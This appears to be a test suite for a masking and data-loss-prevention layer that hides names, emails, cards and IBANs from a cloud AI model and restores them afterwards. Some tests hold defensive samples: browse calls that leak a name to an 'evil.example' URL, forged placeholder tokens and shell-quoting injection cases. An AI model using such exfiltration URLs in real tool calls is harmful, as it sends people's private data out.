// Masked requests (D681): what the organisation hides reaches a brain in the cloud as placeholders, and comes back real.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fire } from '../app/core/hooks.js'
import { LLMError } from '../app/core/llm.js'
import { runTurn } from '../app/core/loop.js'
import { checked, dlpHooks, PLACES } from '../app/ee/detect.js'
import { inCode, mapped, maskHooks, revealInCode, variants } from '../app/ee/mask.js'

const CARD = '4111 1111 1111 1111'
const IBAN = 'FR14 2004 1010 0505 0001 3M02 606'
const BRAIN = { id: 'cloud', model: 'm' }
const MARK = /⟦[A-Z][0-9a-f]{6,}⟧/g

/** Hooks over a conversation of its own, and what they kept and said. @param {any} mask @param {any} [more] @param {any} [say] */
function room(mask = { words: ['Projet Hermès', 'Marie Dupont', "L'Oréal"], hide: ['email', 'phone'] }, more = { detect: ['card', 'iban'] }, say = {}) {
  const kept = /** @type {any[]} */ ([])
  const records = /** @type {any[]} */ ([])
  const told = /** @type {string[]} */ ([])
  const hooks = maskHooks({ ...more, mask }, {
    isLocal: (brain) => brain.api === 'device',
    load: async () => ({ id: '01JTASKULID', records }),
    keep: async (_, meta) => { kept.push(meta); records.push({ meta }) },
    assistant: () => 'Jean',
    open: () => false,
    held: () => told.push('held'),
    heldReason: () => 'A picture was here.',
    why: (values) => `Would send ${values.join()}`,
    mayGo: () => 'May go',
    reason: () => 'Refused',
    // eslint-disable-next-line require-yield
    async* refused(why) { told.push(why); throw new Error(`Refused: ${why}`) },
    ...say,
  })
  return { hooks, kept, records, told }
}

/** A step through the hooks: what went on the wire, and what came back. @param {any} hooks @param {any} e @param {(wire: any) => any[]} [answer] */
async function step(hooks, e, answer = () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: '' } }]) {
  const wires = /** @type {any[]} */ ([])
  const events = []
  for await (const event of await fire(hooks, 'turn.step', { task: 't', brain: BRAIN, system: '', messages: [], ...e }, async function* (wire) {
    wires.push(wire)
    yield* answer(wire)
  })) events.push(event)
  return { wire: wires[0], wires, events, text: events.flatMap((event) => (event.type === 'text' ? [event.delta] : [])).join('') }
}
const user = (/** @type {string} */ content, /** @type {any} */ more = {}) => ({ role: 'user', content, ...more })
const seen = (/** @type {any} */ wire) => JSON.stringify(wire, (key, value) => (key === 'signal' || key === 'brain' ? undefined : value))

test('what is hidden doesn’t go, wherever it is, and placeholders are all that remain of it', async () => {
  const { hooks } = room()
  const secret = ['Projet Hermès', 'Marie Dupont', 'marie@acme.fr', '+33 6 12 34 56 78', CARD, IBAN]
  const text = `Pour ${secret.join(', ')}.`
  const { wire } = await step(hooks, {
    system: `Memory: ${text}`,
    messages: [
      user(text, { documents: [{ name: 'Marie Dupont.pdf', text, source: 1 }] }),
      { role: 'assistant', content: text, toolCalls: [{ id: '1', name: 'send', args: { to: 'marie@acme.fr', 'Marie Dupont': 1, deep: { rows: [[CARD]] }, card: 4111111111111111 } }] },
      { role: 'tool', toolCallId: '1', name: 'send', content: text },
      { role: 'system', content: text },
    ],
    tools: [{ name: 'send', description: `Sends for ${text}`, parameters: { type: 'object', properties: { x: { description: text, enum: ['Marie Dupont'] } } } }],
  })
  const all = seen(wire)
  for (const value of [...secret, '4111111111111111']) assert.ok(!all.includes(value), value)
  assert.ok(all.match(MARK).length > 10)
  assert.equal(wire.messages[0].documents[0].source, 1)
  assert.equal(wire.tools[0].name, 'send')
  assert.ok(wire.system.endsWith('never guess at them or ask what they are.'))
})

test('what comes back is real, in the text, in what it thought, in calls and in the message history keeps', async () => {
  const { hooks } = room()
  /** @type {any} */
  let mark
  const { events, text, wire } = await step(hooks, { messages: [user('Pour Marie Dupont.')] }, (going) => {
    mark = going.messages[0].content.match(MARK)[0]
    return [
      { type: 'thinking', delta: `About ${mark}` },
      { type: 'text', delta: `Bonjour ${mark}.` },
      { type: 'tool_call', call: { id: '1', name: 'send', args: { to: mark, list: [{ who: mark }] } } },
      { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: `Bonjour ${mark}.`, toolCalls: [{ id: '1', name: 'send', args: { to: mark } }], raw: [{ type: 'thinking', thinking: `About ${mark}`, signature: 's' }], rawModel: 'm' } },
    ]
  })
  assert.ok(!seen(wire).includes('Marie'))
  assert.equal(text, 'Bonjour Marie Dupont.')
  assert.equal(events.find((event) => event.type === 'thinking').delta, 'About Marie Dupont')
  assert.deepEqual(events.find((event) => event.type === 'tool_call').call.args, { to: 'Marie Dupont', list: [{ who: 'Marie Dupont' }] })
  const done = events.find((event) => event.type === 'done')
  assert.equal(done.message.content, 'Bonjour Marie Dupont.')
  assert.equal(done.message.toolCalls[0].args.to, 'Marie Dupont')
  // Only the brain's own raw stays as it wrote it: it must come back unchanged.
  assert.equal(done.message.raw[0].thinking, `About ${mark}`)
})

test('a placeholder split across deltas comes back whole, at every cut', async () => {
  const { hooks } = room()
  /** @type {any} */
  const first = await step(hooks, { messages: [user('Marie Dupont')] })
  const mark = first.wire.messages[0].content
  const said = `Oui ${mark}, et ${mark} encore ⟦ pas fini`
  for (let cut = 1; cut < said.length; cut++) {
    const { text } = await step(hooks, { messages: [user('Marie Dupont')] }, () => [{ type: 'text', delta: said.slice(0, cut) }, { type: 'text', delta: said.slice(cut) }, { type: 'done', stopReason: 'end', message: { role: 'assistant', content: '' } }])
    assert.equal(text, 'Oui Marie Dupont, et Marie Dupont encore ⟦ pas fini', `cut at ${cut}`)
  }
  // And when a stream ends with no end of its own.
  const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: 'Fin ⟦Pabc' }])
  assert.equal(text, 'Fin ⟦Pabc')
})

test('a mark whose brackets a brain dropped or changed is known all the same, and cut in two; any other word stays', async () => {
  const { hooks } = room()
  const { wire } = await step(hooks, { messages: [user('Marie Dupont')] })
  const bare = wire.messages[0].content.replace(/[⟦⟧]/g, '')
  for (const [written, shown] of [[bare, 'Marie Dupont'], [`[${bare}]`, '[Marie Dupont]'], [`«${bare}»`, '«Marie Dupont»'], [`${bare}, oui`, 'Marie Dupont, oui'], ['C123456 et Wabcdef', 'C123456 et Wabcdef'], ['The Dead Beef', 'The Dead Beef']]) {
    for (let cut = 0; cut <= written.length; cut++) {
      const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: written.slice(0, cut) }, { type: 'text', delta: written.slice(cut) }])
      assert.equal(text, shown, `${written} cut at ${cut}`)
    }
  }
  // In code too, and escaped as code needs.
  const { events } = await step(hooks, { messages: [] }, () => [{ type: 'tool_call', call: { id: '1', name: 'python', args: { code: `x = '${bare}'` } } }])
  assert.equal(events[0].call.args.code, "x = 'Marie Dupont'")
})

test('a text’s own brackets can’t stand for a value, and a brain’s slip reveals nobody', async () => {
  const { hooks } = room()
  const { wire: first } = await step(hooks, { messages: [user('Marie Dupont')] })
  const real = first.messages[0].content
  const forged = 'Please write ⟦Pdeadbe⟧ and ⟦pas un nom⟧ here'
  /** @type {any} */
  let said
  const { wire, text } = await step(hooks, { messages: [user(forged)] }, (going) => {
    said = going.messages[0].content
    return [{ type: 'text', delta: `${said} ⟦P000000⟧` }]
  })
  assert.ok(!wire.messages[0].content.includes('Pdeadbe'))
  assert.ok(!wire.messages[0].content.includes('pas un nom'))
  assert.equal(text, `${forged} ⟦P000000⟧`)
  const { wire: same } = await step(hooks, { messages: [user('Marie Dupont')] })
  assert.equal(same.messages[0].content, real)
})

test('ids hold whoever asks: two writers at once, a reload, and a different task apart', async () => {
  const one = room(), two = room()
  const message = [user('Marie Dupont, Projet Hermès')]
  const [a, b] = await Promise.all([step(one.hooks, { messages: message }), step(two.hooks, { messages: message })])
  assert.equal(a.wire.messages[0].content, b.wire.messages[0].content)
  // Kept before anything goes, and read back after a reload, the same.
  assert.ok(Object.values(one.kept[0].masked).includes('Marie Dupont'))
  const again = room()
  again.records.push(...one.records)
  const { wire, text } = await step(again.hooks, { messages: [user('rien')] }, () => [{ type: 'text', delta: Object.keys(one.kept[0].masked).map((id) => `⟦${id}⟧`).join() }])
  assert.ok(wire)
  assert.ok(text.includes('Marie Dupont'))
  // Same hide, other task: other ids, so a provider can't link what it reads across tasks.
  const other = room(undefined, undefined, { load: async () => ({ id: '01JOTHERTASK', records: [] }) })
  const { wire: elsewhere } = await step(other.hooks, { messages: message })
  assert.notEqual(elsewhere.messages[0].content, a.wire.messages[0].content)
  assert.ok(!seen(a.wire).includes('01JTASKULID'))
})

test('a longer name is never a known short one and a surname left out', async () => {
  const names = async (/** @type {string} */ text) => [...text.matchAll(/Marie Durand|Marie/g)].map((match) => ({ start: match.index, end: match.index + match[0].length, kind: 'person' }))
  const { hooks } = room({ words: [] }, { detect: ['card'] }, { names })
  const { wire: short } = await step(hooks, { messages: [user('Marie vient.')] })
  const { wire } = await step(hooks, { messages: [user('Marie Durand vient.'), user('Marie vient.')] })
  assert.ok(!seen(wire).includes('Durand'))
  assert.ok(!wire.messages[0].content.startsWith(short.messages[0].content.split(' ')[0]))
  assert.equal(wire.messages[1].content, short.messages[0].content)
})

test('what must stay stays, the assistant’s name first, or it would rewrite the prompt', async () => {
  const { hooks } = room({ words: ['Jean', 'Warehouse', 'ACME'], keep: ['Warehouse'] }, {})
  const { wire } = await step(hooks, { system: 'You are Jean, for Warehouse.', messages: [user('Jean and ACME and Warehouse')] })
  assert.ok(wire.system.startsWith('You are Jean, for Warehouse.'))
  assert.match(wire.messages[0].content, /^Jean and ⟦W[0-9a-f]+⟧ and Warehouse$/)
})

test('values cut before the hook don’t go in part', async () => {
  const { hooks } = room()
  await step(hooks, { messages: [user('Marie Dupont')] })
  for (const [text, gone] of [['Écrit par Marie Dup', 'Marie Dup'], ['upont a écrit', 'upont'], [`Carte ${CARD.slice(0, 14)}`, CARD.slice(0, 14)], [`IBAN ${IBAN.slice(0, 19)}`, IBAN.slice(0, 19)], [`${CARD.slice(-14)} fin`, CARD.slice(-14)]]) {
    const { wire } = await step(hooks, { messages: [user(text)] })
    assert.ok(!wire.messages[0].content.includes(gone), wire.messages[0].content)
  }
  // But an ordinary text keeps its numbers: what a brain works things out from.
  const { wire } = await step(hooks, { messages: [user('Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')] })
  assert.equal(wire.messages[0].content, 'Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')
})

const AWKWARD = ["L'Oréal", 'O\'Brien & "Sons"', '"Le Monde"', 'Prix $5 `x`', 'C:\\Users\\Marie', 'Marie\nDupont']

test('a value lands in code as what it is, in each tool and wherever it stands', () => {
  const run = (/** @type {string} */ code, /** @type {'shell' | 'js' | 'py'} */ lang, /** @type {string} */ value) => revealInCode(code, lang, () => value)
  for (const value of AWKWARD) {
    assert.equal(JSON.parse(run('⟦Pabcdef⟧', 'js', value)), value)
    for (const quote of ["'", '"', '`']) {
      const code = run(`x = ${quote}A ⟦Pabcdef⟧ B${quote}`, 'js', value)
      // eslint-disable-next-line no-new-func
      assert.equal(new Function(`let x; ${code}; return x`)(), `A ${value} B`, code)
    }
    assert.equal(JSON.parse(run('"⟦Pabcdef⟧"', 'py', value)), value)
    assert.equal(run("# it's ⟦Pabcdef⟧\n", 'py', value), `# it's ${value.replace(/\s*\n\s*/g, ' ')}\n`)
  }
  assert.equal(run("echo 'A ⟦Pabcdef⟧'", 'shell', "L'Oréal"), "echo 'A L'\\''Oréal'")
  assert.equal(run('echo "A ⟦Pabcdef⟧"', 'shell', 'Prix $5 `x`'), 'echo "A Prix \\$5 \\`x\\`"')
  assert.equal(run('echo ⟦Pabcdef⟧', 'shell', "L'Oréal"), "echo 'L'\\''Oréal'")
  assert.equal(run("cat <<'EOF'\nit's ⟦Pabcdef⟧\nEOF\necho ⟦Pabcdef⟧", 'shell', "L'Oréal"), "cat <<'EOF'\nit's L'Oréal\nEOF\necho 'L'\\''Oréal'")
  assert.equal(run('cat <<EOF\nA ⟦Pabcdef⟧\nEOF', 'shell', '$5'), 'cat <<EOF\nA \\$5\nEOF')
  assert.equal(run('"""A ⟦Pabcdef⟧"""', 'py', 'x"y'), '"""A x\\"y"""')
  // A quote in a comment doesn't open a string.
  assert.equal(run("// don't\nx = '⟦Pabcdef⟧'", 'js', "L'Oréal"), "// don't\nx = 'L\\'Oréal'")
  assert.equal(run("x = '⟦Pabcdef⟧' /* it's */ + '⟦Pabcdef⟧'", 'js', 'a'), "x = 'a' /* it's */ + 'a'")
  assert.equal(run('⟦nope⟧', 'js', 'a'), '⟦nope⟧')
})

test('a value escaped into code, or encoded in an address, doesn’t go when a call is read again', async () => {
  for (const value of AWKWARD) {
    const { hooks } = room({ words: [value] }, {})
    /** @type {any} */
    let mark
    const { wire } = await step(hooks, { messages: [user(value)] })
    mark = wire.messages[0].content
    const forms = [...['"', "'", '`'].map((quote) => inCode(value, quote, 'js')), ...["'", '"', null].map((state) => inCode(value, state, 'shell')), encodeURIComponent(value), JSON.stringify(value).slice(1, -1)]
    assert.ok(forms.every((form) => variants(value).has(form) || form.startsWith("'")), value)
    const { wire: replay } = await step(hooks, { messages: [{ role: 'assistant', content: '', toolCalls: forms.map((form, n) => ({ id: String(n), name: 'bash', args: { command: `echo ${form} x` } })) }] })
    for (const call of replay.messages[0].toolCalls) assert.ok(call.args.command.includes(mark), call.args.command)
  }
  // Python's json.dumps, with what follows it.
  const { hooks } = room({ words: ['Hermès'] }, {})
  const { wire } = await step(hooks, { messages: [user('{"a": "Herm\\u00e8s"} https://x.example/?q=Herm%C3%A8s&r=1')] })
  assert.ok(!seen(wire).toLowerCase().includes('herm'))
})

test('the last sweep refuses what masking left, whatever put it there', async () => {
  // A brain's own raw isn't swept, but anything else is: here a word only a decoded address shows.
  const { hooks, told } = room({ words: ['Hermes Ltd'] }, {})
  await assert.rejects(step(hooks, { messages: [user('https://x.example/?q=Hermes%20%4Ctd')] }), /Refused/)
  assert.match(told[0], /still there: value/)
  const card = room({ hide: [] }, { detect: ['card'] })
  await assert.rejects(step(card.hooks, { messages: [user('https://x.example/?c=4111%201111%201111%201111')] }), /Refused/)
  assert.ok(!card.told.join().includes('4111'))
})

test('it fails closed: nothing goes when finding or keeping fails', async () => {
  const wires = async (/** @type {any} */ say) => {
    const { hooks, told } = room(undefined, undefined, say)
    let went = 0
    await assert.rejects(async () => { for await (const _ of await fire(hooks, 'turn.step', { task: 't', brain: BRAIN, messages: [user('Marie Dupont')] }, async function* () { went++; yield { type: 'text', delta: 'x' } })); }, /Refused/)
    assert.equal(went, 0)
    return told
  }
  await wires({ names: async () => { throw new Error('no model') } })
  await wires({ keep: async () => { throw new Error('disk') } })
  await wires({ load: async () => { throw new Error('unreadable') } })
  // A brain on this device, or one the organisation allows, reads it as it is.
  const { hooks } = room(undefined, { detect: ['card'], brains: ['vault'] })
  for (const brain of [{ id: 'device', api: 'device' }, { id: 'vault', model: 'm' }]) {
    const { wire } = await step(hooks, { brain, messages: [user('Marie Dupont')] })
    assert.equal(wire.messages[0].content, 'Marie Dupont')
  }
})

test('the audit hears how many of each kind, for its task, and never what', async () => {
  const told = /** @type {any[]} */ ([])
  const { hooks } = room(undefined, undefined, { told: (/** @type {string[]} */ letters, /** @type {string} */ task) => told.push({ letters, task }) })
  await step(hooks, { messages: [user('Marie Dupont, marie@acme.fr')] })
  // Only what's new is told.
  await step(hooks, { messages: [user('Marie Dupont, marie@acme.fr')] })
  assert.equal(told.length, 1)
  assert.deepEqual(told[0].letters.sort(), ['E', 'W'])
  assert.equal(told[0].task, 't')
  assert.ok(!JSON.stringify(told).includes('Marie'))
})

test('a label still refuses: hiding names doesn’t make a marked document readable', async () => {
  const dlp = { detect: ['card'], labels: ['Confidentiel'], brains: ['vault'], mask: { words: ['ACME'] } }
  const hooks = dlpHooks(dlp, { isLocal: () => false, reason: () => '', why: () => '', async* refused() { throw new Error('Refused') } })
  const pass = await fire(hooks, 'turn.step', { brain: BRAIN, messages: [user(`ACME ${CARD}`)] }, () => 'sent')
  assert.equal(pass, 'sent')
  const refused = await fire(hooks, 'turn.step', { brain: BRAIN, messages: [user('Document confidentiel')] }, () => 'sent')
  await assert.rejects(async () => { for await (const _ of refused); }, /Refused/)
})

test('a brain’s raw goes back only as it wrote it to this mask; from the first that didn’t, none does', async () => {
  const { hooks } = room()
  const raw = [{ type: 'thinking', thinking: 'About a mark', signature: 'sig' }]
  await step(hooks, { messages: [user('Bonjour')] }, () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: 'ok', raw } }])
  const before = [{ type: 'thinking', thinking: 'From before masking, about Marie Dupont', signature: 'sig2' }]
  const assistant = (/** @type {any} */ blocks, /** @type {any} */ more = {}) => ({ role: 'assistant', content: 'ok', raw: blocks, rawModel: 'm', ...more })
  const kept = (/** @type {any} */ wire) => wire.messages.map((/** @type {any} */ message) => Boolean(message.raw))
  // Its own: goes, unchanged.
  const own = await step(hooks, { messages: [user('a'), assistant(raw), user('b')] })
  assert.deepEqual(own.wire.messages[1].raw, raw)
  // An earlier one, then its own after it: neither.
  const earlier = await step(hooks, { messages: [user('a'), assistant(before), user('b'), assistant(raw), user('c')] })
  assert.deepEqual(kept(earlier.wire), [false, false, false, false, false])
  assert.ok(!seen(earlier.wire).includes('Marie'))
  // Its own, then an earlier one: only what comes before the first bad one.
  const mixed = await step(hooks, { messages: [user('a'), assistant(raw), user('b'), assistant(before), user('c')] })
  assert.deepEqual(kept(mixed.wire), [false, true, false, false, false])
  // Another model's never goes anyway, and costs nothing.
  const other = await step(hooks, { messages: [assistant(before, { rawModel: 'other' }), user('b'), assistant(raw), user('c')] })
  assert.deepEqual(kept(other.wire), [false, false, true, false])
  // A brain paused in its own search can't go on from part of it.
  await assert.rejects(step(hooks, { messages: [user('a'), assistant(before)] }), /Refused/)
})

test('pictures are held back unless policy sends them, and a file’s bytes with them', async () => {
  const images = [{ mimeType: 'image/png', data: 'AAAA' }]
  const { hooks, told } = room()
  const { wire } = await step(hooks, { messages: [user('Voici', { documents: [{ name: 'scan.png', text: '', images }] })] })
  assert.equal(wire.messages[0].documents[0].images, undefined)
  assert.equal(wire.messages[0].documents[0].text, 'A picture was here.')
  assert.deepEqual(told, ['held'])
  const sent = await step(room({ words: ['x1'], pictures: 'send' }, {}).hooks, { messages: [user('Voici', { documents: [{ name: 'scan.png', text: '', images }] })] })
  assert.deepEqual(sent.wire.messages[0].documents[0].images, images)
  const check = (/** @type {any} */ h, /** @type {any} */ e) => fire(h, 'tool.check', { task: 't', ...e }, () => ({ decision: 'allow' }))
  assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'x', from: 'scan.png' } })).decision, 'never')
  assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'a cat' } })).decision, 'allow')
})

test('a value made real asks before it leaves, whatever Always allow said', async () => {
  const { hooks } = room()
  await step(hooks, { messages: [user('Marie Dupont, L’équipe')] })
  const check = (/** @type {any} */ h, /** @type {any} */ e) => fire(h, 'tool.check', { task: 't', ...e }, () => ({ decision: 'allow' }))
  for (const e of [
    { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } },
    { kind: 'other', name: 'mail_send', args: { body: 'Pour Marie Dupont' } },
    { kind: 'search', name: 'web_search', args: { query: 'Marie Dupont' } },
  ]) {
    const asked = await check(hooks, e)
    assert.equal(asked.decision, 'ask', e.name)
    assert.equal(asked.meta.why, 'Would send Marie Dupont')
    assert.equal(asked.by, 'dlp')
  }
  // What stays on the device, and what holds none of it, is as the rules said.
  assert.equal((await check(hooks, { kind: 'edit', name: 'write', args: { text: 'Marie Dupont' } })).decision, 'allow')
  assert.equal((await check(hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://example.com' } })).decision, 'allow')
  // Code in the sandbox asks only where it reaches sites without asking; a site's own card says what may go.
  assert.equal((await check(hooks, { kind: 'execute', name: 'python', args: { code: 'x = "Marie Dupont"' } })).decision, 'allow')
  const open = room(undefined, undefined, { open: () => true })
  await step(open.hooks, { messages: [user('Marie Dupont')] })
  assert.equal((await check(open.hooks, { kind: 'execute', name: 'python', args: { code: 'x = "Marie Dupont"' } })).decision, 'ask')
  assert.equal((await fire(hooks, 'tool.check', { task: 't', kind: 'fetch', name: 'reach_site', args: { site: 'evil.example' } }, () => ({ decision: 'ask' }))).meta.why, 'May go')
  // `then: never` refuses.
  const never = room(undefined, { detect: ['card'], then: 'never' })
  await step(never.hooks, { messages: [user('Marie Dupont')] })
  const refused = await check(never.hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } })
  assert.equal(refused.decision, 'never')
  assert.equal(refused.reason, 'Refused')
})

test('the map goes with the records: going back forgets what it said, and reads the rest again', async () => {
  const { hooks, records } = room()
  await step(hooks, { messages: [user('Marie Dupont')] })
  assert.equal(records.length, 1)
  const mark = Object.keys(records[0].meta.masked)[0]
  // A rewind took the note: what the file says from now on is what counts.
  records.length = 0
  await fire(hooks, 'remove', { task: 't' }, () => ({}))
  const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: `⟦${mark}⟧` }])
  assert.equal(text, `⟦${mark}⟧`)
  // And the same value comes back as the same id, kept again.
  await step(hooks, { messages: [user('Marie Dupont')] })
  assert.deepEqual(records[0].meta.masked, { [mark]: 'Marie Dupont' })
})

test('detectors say where, and a private key goes whole, to its end or to the text’s', () => {
  const text = `Carte ${CARD} et ${IBAN}.`
  const places = (/** @type {string} */ id, /** @type {string} */ of) => PLACES[id](of).map(([start, end]) => of.slice(start, end))
  assert.deepEqual(places('card', text), [CARD])
  assert.deepEqual(places('iban', text), [IBAN])
  assert.deepEqual(places('nir', 'NIR 2 55 08 14 168 025 38 ok'), ['2 55 08 14 168 025 38'])
  assert.deepEqual(places('ssn', 'SSN 078-05-1120.'), ['078-05-1120'])
  const [begin, end] = ['BEGIN', 'END'].map((word) => `-----${word} PRIVATE KEY-----`)
  const key = `${begin}\nabc\n${end}`
  assert.deepEqual(places('secret', `x ${key} y`), [key])
  assert.deepEqual(places('secret', `x ${begin}\nabc`), [`${begin}\nabc`])
})

test('deep arguments and long runs take no time and no stack', async () => {
  let deep = /** @type {any} */ ('Marie Dupont')
  for (let i = 0; i < 20_000; i++) deep = { deep }
  const copy = mapped(deep, (text) => text.toUpperCase())
  let at = copy
  while (typeof at === 'object') at = at.DEEP
  assert.equal(at, 'MARIE DUPONT')
  const { hooks } = room({ hide: ['email', 'phone'] }, { detect: ['card', 'iban'] })
  const started = performance.now()
  await step(hooks, { messages: [user('a'.repeat(500_000)), user('1 '.repeat(200_000)), user('ab12 '.repeat(100_000))] })
  assert.ok(performance.now() - started < 3000, `${performance.now() - started} ms`)
})

test('a mask that can’t work says why', () => {
  assert.throws(() => checked({ mask: 'all' }), /mask that is not an object/)
  assert.throws(() => checked({ mask: { hide: ['person'] } }), /can't hide "person"/)
  assert.throws(() => checked({ mask: { words: [''] } }), /a word mask can't use/)
  assert.throws(() => checked({ mask: { words: ['ab'], pictures: 'maybe' } }), /neither "hold" nor "send"/)
  assert.throws(() => checked({ mask: {} }), /masks nothing/)
  assert.deepEqual(checked({ mask: { words: ['ACME'], hide: ['email'], keep: ['Warehouse'], pictures: 'send' } }).mask, { words: ['ACME'], hide: ['email'], keep: ['Warehouse'], pictures: 'send' })
  assert.ok(checked({ detect: ['card'], mask: {} }))
})

/** A whole turn through Jean's loop, each request answered by `answer`, the step's wire beside it. @param {any[]} hooks @param {(wire: any, n: number) => any[]} answer @param {any} [more] */
async function turn(hooks, answer, more = {}) {
  const wires = /** @type {any[]} */ ([])
  const records = /** @type {any[]} */ ([])
  const result = await runTurn({
    brain: BRAIN, apiKey: 'k', system: 'You are Jean. Memory: Marie Dupont.', history: [{ role: 'user', content: 'Pour Marie Dupont, Projet Hermès' }], rule: () => 'allow', retries: [0, 0],
    hooks, about: { task: 't' }, persist: async (kept) => { records.push(...kept) },
    stream: /** @type {any} */ (async function* (/** @type {any} */ wire) {
      wires.push(wire)
      yield* answer(wire, wires.length)
    }),
    ...more,
  })
  return { wires, records, result }
}
const markIn = (/** @type {any} */ wire) => wire.messages[0].content.match(MARK)[0]
const ended = (/** @type {string} */ content = '', /** @type {any} */ more = {}) => ({ type: 'done', stopReason: 'end', message: { role: 'assistant', content, ...more } })

test('through a whole turn, a retry, a call and its result, what the loop keeps is real and what it sends never is', async () => {
  const { hooks } = room()
  const ran = /** @type {any[]} */ ([])
  const tool = { spec: { name: 'send', description: 'Sends', parameters: { type: 'object' } }, kind: 'edit', title: () => 'Send', run: async (/** @type {any} */ args) => { ran.push(args); return `Sent to ${args.to}, marie@acme.fr` } }
  const { wires, records, result } = await turn(hooks, (wire, n) => {
    if (n === 1) throw new LLMError('Busy', { code: 'server' })
    const mark = markIn(wire)
    if (n === 2) return [{ type: 'tool_call', call: { id: '1', name: 'send', args: { to: mark } } }, { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'send', args: { to: mark } }] } }]
    return [{ type: 'text', delta: `Done for ${mark}` }, ended(`Done for ${mark}`)]
  }, { tools: [tool] })
  assert.equal(wires.length, 3)
  assert.deepEqual(ran, [{ to: 'Marie Dupont' }])
  assert.equal(result.text, 'Done for Marie Dupont')
  for (const wire of wires) for (const value of ['Marie', 'Hermès', 'marie@acme.fr']) assert.ok(!seen(wire).includes(value), value)
  assert.ok(wires[2].messages.some((/** @type {any} */ message) => message.role === 'tool' && /^Sent to ⟦/.test(message.content)))
  const kept = JSON.stringify(records)
  assert.ok(kept.includes('Done for Marie Dupont'))
  assert.ok(!kept.includes('⟦'))
})

test('a summary and a helper’s turn go masked, and come back real', async () => {
  const { hooks } = room()
  let summed = false
  const compact = { on: 'turn.compact', run: async (/** @type {any} */ e) => {
    if (summed) return null
    summed = true
    const { text } = await e.ask([...e.messages, { role: 'user', content: 'Sum this up' }])
    return { at: 'now', by: 'jean', update: { sessionUpdate: 'compaction_update', status: 'completed', _meta: { text } } }
  } }
  const helper = { spec: { name: 'delegate', description: 'Hands over', parameters: { type: 'object' } }, kind: 'other', title: () => 'Delegate',
    run: async (/** @type {any} */ _, /** @type {any} */ ctx) => (await ctx.turn({ history: [{ role: 'user', content: 'Help Marie Dupont' }], tools: [] })).text }
  /** @type {string[]} */
  const helped = []
  const { wires } = await turn([...hooks, compact], (wire, n) => {
    const mark = markIn(wire)
    if (n === 1) return [{ type: 'text', delta: `Summary of ${mark}` }, ended(`Summary of ${mark}`)]
    if (n === 2) return [{ type: 'tool_call', call: { id: '1', name: 'delegate', args: {} } }, { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'delegate', args: {} }] } }]
    if (n === 3) return [{ type: 'text', delta: `Helped ${mark}` }, ended(`Helped ${mark}`)]
    helped.push(wire.messages.find((/** @type {any} */ message) => message.role === 'tool').content)
    return [{ type: 'text', delta: 'ok' }, ended('ok')]
  }, { window: 1000, tools: [helper] })
  assert.ok(wires.length >= 4)
  for (const wire of wires) assert.ok(!seen(wire).includes('Marie'))
  // The summary it reads on from is masked again, and a helper's report came back real before going out as a mark.
  assert.match(wires[1].messages[0].content, /^Summary of ⟦/)
  assert.match(helped[0], /^Helped ⟦/)
})
